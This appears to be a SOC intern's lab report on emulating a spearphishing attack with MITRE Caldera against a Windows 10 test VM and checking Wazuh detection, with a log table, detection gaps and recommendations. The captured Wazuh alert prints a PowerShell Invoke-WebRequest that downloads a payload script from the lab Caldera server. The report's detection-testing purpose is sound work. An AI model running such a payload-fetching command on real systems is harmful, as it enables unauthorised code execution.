# Task 6 — Adversary Emulation Practice

## Overview

**Objective:** Simulate adversary TTPs using MITRE Caldera and validate SOC detection capabilities using Wazuh.  
**MITRE Technique:** T1566 — Phishing (Spearphishing Link)  
**Tools Used:** MITRE Caldera, Wazuh SIEM  
**Date:** 2025-04-03  
**Analyst:** SOC Intern — CyArt Tech India  

---

## 1. Hypothesis

> "A threat actor targeting internal users may leverage spearphishing emails containing malicious links to establish initial access on endpoints within the 192.168.1.0/24 network segment."

**MITRE ATT&CK Mapping:**

| Tactic       | Technique ID | Technique Name          |
|--------------|--------------|-------------------------|
| Initial Access | T1566       | Phishing                |
| Initial Access | T1566.002   | Spearphishing Link      |
| Execution    | T1204.001    | User Execution: Link    |

---

## 2. Emulation Setup

### Environment

| Component     | Details                          |
|---------------|----------------------------------|
| Caldera Server | 192.168.1.10 (Kali VM)          |
| Target Agent  | 192.168.1.105 (Windows 10 VM)   |
| Wazuh Manager | 192.168.1.20                    |
| Wazuh Agent   | Deployed on 192.168.1.105       |

### Caldera Configuration

- **Operation Name:** `phish-sim-t1566`
- **Adversary Profile:** Spearphishing — Initial Access
- **Ability Used:** `Send Spearphishing Link` (Caldera Stockpile)
- **Executor:** PowerShell on Windows agent
- **Planner:** Sequential

---

## 3. Emulation Simulation Log

| Timestamp            | TTP         | Detection Status | Source IP      | Target            | Notes                                      |
|----------------------|-------------|------------------|----------------|-------------------|--------------------------------------------|
| 2025-04-03 09:05:12  | T1566       | Detected         | 192.168.1.10   | 192.168.1.105     | Caldera agent initiated phishing simulation |
| 2025-04-03 09:05:47  | T1566.002   | Detected         | 192.168.1.10   | 192.168.1.105     | Malicious link payload delivered via agent  |
| 2025-04-03 09:06:03  | T1204.001   | Not Detected     | 192.168.1.105  | Internal          | User execution step — no Wazuh rule matched |
| 2025-04-03 09:06:31  | T1566       | Detected         | 192.168.1.10   | 192.168.1.105     | Wazuh alert: Suspicious PowerShell activity |

---

## 4. Wazuh Detection Output

**Alert triggered:** Rule ID `92200` — Suspicious PowerShell execution detected  
**Severity Level:** 10 (Critical)  
**Log Source:** Wazuh Agent — WIN10-ENDPOINT (192.168.1.105)

```
** Alert 1712132791.453210: - windows,powershell,
2025 Apr 03 09:06:31 WIN10-ENDPOINT->/var/log/wazuh/alerts
Rule: 92200 (level 10) -> 'Suspicious PowerShell Execution - Possible Phishing Payload'
Src IP: 192.168.1.10
User: SYSTEM
Full log: EventID=4104 ScriptBlock: Invoke-WebRequest -Uri http://192.168.1.10:8888/caldera -OutFile C:\Users\Public\payload.ps1
```

---

## 5. Detection Gaps Identified

| Gap # | Description                                          | MITRE Technique | Recommendation                              |
|-------|------------------------------------------------------|-----------------|---------------------------------------------|
| 1     | No rule for user execution of downloaded link (T1204) | T1204.001      | Create Wazuh rule for browser-spawned processes |
| 2     | No email header inspection capability                 | T1566.001      | Integrate email gateway logs into Wazuh      |
| 3     | No alert for outbound HTTP to non-whitelisted hosts   | T1566.002      | Enable Wazuh network traffic monitoring      |

---

## 6. Emulation Report (100 Words)

On 2025-04-03, a MITRE Caldera adversary emulation was conducted to simulate a spearphishing attack (T1566) against a Windows 10 endpoint (192.168.1.105). The simulation delivered a malicious PowerShell link payload mimicking real-world initial access techniques. Wazuh successfully detected three of four emulated events, triggering Rule 92200 for suspicious PowerShell execution. A critical detection gap was identified: user execution behaviour (T1204.001) produced no alert, indicating an absence of browser-spawned process monitoring rules. Additionally, no email header analysis or outbound HTTP anomaly detection was configured. Recommendations include creating targeted Wazuh detection rules and integrating email gateway telemetry to improve coverage.

---

## 7. References

- MITRE ATT&CK T1566: https://attack.mitre.org/techniques/T1566/
- MITRE Caldera Documentation: https://caldera.readthedocs.io/
- Wazuh Detection Rules: https://documentation.wazuh.com/current/user-manual/ruleset/
